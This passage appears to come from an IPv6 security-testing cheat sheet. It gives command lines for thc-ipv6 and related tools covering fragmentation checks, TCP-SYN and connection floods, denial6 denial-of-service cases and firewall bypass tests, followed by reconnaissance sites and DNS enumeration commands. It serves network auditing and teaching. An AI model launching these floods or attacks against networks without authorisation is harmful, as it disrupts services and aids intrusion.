Atomic fragments | `$ sudo ./frag6 -i eth0 --frag-type atomic --frag-id 100 --dst-address TARGETIPv6ADDR --verbose` | Atomic fragments are IPv6 packets which are not fragmented but still contain a (redundant) Fragment Header. IPv6 packets that contain a Fragment Header with the Fragment Offset set to 0 and the M flag set to 0. If atomic fragments overlap both of the other ones, all of them can be discarded
Fragment reassembly policy | `$ sudo ./frag6 -i eth0 -v --frag-reass-policy --dst-address TARGETIPv6ADDR --verbose` | Assess fragment reassembly policy
Fragment firewall and implementation tests | `$ sudo ./fragmentation6 eth0 TARGETIPv6ADDR` | The tool fragmentation6 can perform a fragment firewall and implementation check
TCP SYN | `$ sudo ./thcsyn6 eth0 TARGETIPv6ADDR DSTPORT`<br /> 'thcsyn6 -h' has interesting options, <br /> or `$ sudo ./tcp6 -i eth0 --src-address SRCIPv6ADDR --dst-address TARGETIPv6ADDR --dst-port DSTPORT --tcp-flags S --flood-sources 100 --loop --sleep 1 --verbose` | Flood the target with TCP-SYN packets. Destination port can be randomized if you supply "x" as port
Buffer / Connections | `$ sudo ./tcp6 -i eth0 --dst-address TARGETIPv6ADDR --dst-port 80 --listen --src-address TARGETIPv6ADDR/112 --flood-ports 10 --loop --rate-limit 100pps --data "GET / HTTP/1.0\r\n\r\n" --close-mode LAST-ACK` | A buffer/connections flood can be done by TCP-SYN with no controlling process and will make a lots of queue data for such connections
Other denial of services | `$ sudo ./denial6 eth0 TARGETIPv6ADDR CASENUMBER` | The tools 'denial6' allow to performs various denial of services attacks.<br /> Case number :<br /> 1 : large hop-by-hop header with router-alert and filled with unknown options<br /> 2 : large destination header filled with unknown options<br /> 3 : hop-by-hop header with router alert option plus 180 headers<br /> 4 : hop-by-hop header with router alert option plus 178 headers + ping<br /> 5 : AH header + ping<br /> 6 : first fragments of a ping with a hop-by-hop header with router alert<br /> 7 : large hop-by-hop header filled with unknown options (no router alert
Firewall audit & Filter bypass tests | `$ sudo ./firewall6 -H eth0 TARGETIPv6ADDR DSTPORT` # Option '-u' for UDP | Performs various access control & bypass attempts to check implementations
Search for a black hole | `$ blackhole6` and other options with `$ scan6 ` | Search for a black hole can be useful to find out who is dropping specific packets, network reconnaissance or just checking if you EH-enabled attacks would work
Playing with IPv6 Addressing | `$ addr6` Look at `$ man addr6` then try `$ cat file.txt | addr6 -i -s` | Learn IPv6 addressing through IPv6 manipulation tools

### :mag:IPv6 addresses & domains Research/Investigation
Name | URL
------------------------------------ | ---------------------------------------------
IP research | https://whatismyipaddress.com/
BGP Toolkit | http://bgp.he.net/
BGP IPv6 progress report | http://bgp.he.net/ipv6-progress-report.cgi
DNS | A domain analysis could reveal IPv6 addresses (AAAA & PTR records)
SSL | An SSL analysis could reveal IPv6 addresses too
IPv4 - IPv6 | Search for dual stacked host
Google dorks | site:ipv6.*
Recent websites validated | http://ipv6-test.com/validate.php
Recent websites added | http://sixy.ch/
Shodan | https://www.shodan.io/
IPv6 map's project | https://mrlooquer.com/
Dual Stack Chart | http://ipv6eyechart.ripe.net/
TCP utils | http://www.tcpiputils.com/
Ultra tools | https://www.ultratools.com/tools/asnInfo
Black list | https://mxtoolbox.com/blacklists.aspx
extract_hosts6.sh | https://github.com/vanhauser-thc/thc-ipv6/blob/master/extract_hosts6.sh
extract_networks6.sh | https://github.com/vanhauser-thc/thc-ipv6/blob/master/extract_networks6.sh

### :mag:Domain Name System and Autonomous System Research/Investigation
Action | Command
------------------------------------ | ---------------------------------------------
DNS lookup | `$ nslookup -query=AAAA DOMAIN`
DNS lookup | `$ host -t AAAA DOMAIN`
DNS lookup | `$ dig -6 AAAA DOMAIN`
Reverse lookup | `$ dig -x IPv6ADDR`
DNS enumeration | `$ ./dnsdict6 -d DOMAIN`
DNS enumeration (PTR request) | `$ ./dnsrevenum6 DNSSERVER IPv6ADDR/64`
DNS lookup with a domain list | `$ cat domainsList.txt \| sudo script6 get-aaaa`
DNS enumeration | `$ sudo script6 get-bruteforce-aaaa DOMAIN`
AS-related info | `$ sudo script6 get­-as IPv6ADDR`
AS-related info | `$ sudo script6 get­-asn IPv6ADDR`
Google DNS | IPv4 : 8.8.4.4, 8.8.8.8<br /> IPv6 : 2001:4860:4860::8888, 2001:4860:4860::8844
IPv6 rDNS Nameservers | http://bgp.he.net/ipv6-progress-report.cgi?section=ipv6_rdns



